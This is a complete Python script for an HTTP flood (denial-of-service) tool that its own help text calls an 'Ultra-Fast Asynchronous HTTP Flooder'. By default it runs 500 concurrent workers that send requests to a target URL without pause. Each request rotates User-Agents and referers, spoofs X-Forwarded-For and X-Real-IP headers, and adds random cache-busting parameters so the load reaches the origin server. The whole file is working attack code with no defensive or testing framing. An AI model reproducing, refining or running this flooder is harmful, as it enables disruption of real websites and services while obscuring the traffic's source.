import asyncio
import aiohttp
import random
import time
import argparse
import sys

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
]

async def flood_worker(session, url, stats):
    while True:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
            "X-Real-IP": f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        
        # Add random query parameter to bypass cache
        sep = "&" if "?" in url else "?"
        target_url = f"{url}{sep}v={random.randint(100000, 999999)}"
        
        try:
            async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as response:
                stats['requests'] += 1
                if response.status == 200:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
                # Consume body to allow connection reuse
                await response.read()
        except Exception:
            stats['requests'] += 1
            stats['failed'] += 1
        
        # Yield control briefly to prevent task starvation if necessary, 
        # but for max flood we just continue immediately.
        # await asyncio.sleep(0.001)

async def monitor(stats):
    start_time = time.time()
    while True:
        elapsed = time.time() - start_time
        if elapsed > 0:
            rps = stats['requests'] / elapsed
            print(f"\r[STATUS] Time: {elapsed:.1f}s | Total Req: {stats['requests']} | Success: {stats['success']} | Failed: {stats['failed']} | RPS: {rps:.2f}", end="", flush=True)
        await asyncio.sleep(1)

async def main():
    parser = argparse.ArgumentParser(description="Ultra-Fast Asynchronous HTTP Flooder")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-c", "--concurrency", type=int, default=500, help="Concurrent workers")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Duration in seconds (0 for infinite)")
    args = parser.parse_args()

    stats = {'requests': 0, 'success': 0, 'failed': 0}
    
    print(f"[INFO] Initializing flood on {args.url} with {args.concurrency} workers...")
    
    # Large connection pool to handle high concurrency
    connector = aiohttp.TCPConnector(
        limit=args.concurrency,
        ssl=False,
        use_dns_cache=True,
        ttl_dns_cache=300,
        keepalive_timeout=30
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [asyncio.create_task(flood_worker(session, args.url, stats)) for _ in range(args.concurrency)]
        monitor_task = asyncio.create_task(monitor(stats))
        
        if args.duration > 0:
            await asyncio.sleep(args.duration)
            for w in workers:
                w.cancel()
            monitor_task.cancel()
            print(f"\n[INFO] Flood duration of {args.duration}s reached.")
        else:
            try:
                await asyncio.gather(*workers)
            except asyncio.CancelledError:
                pass
            except KeyboardInterrupt:
                print("\n[INFO] Flood stopped by user.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
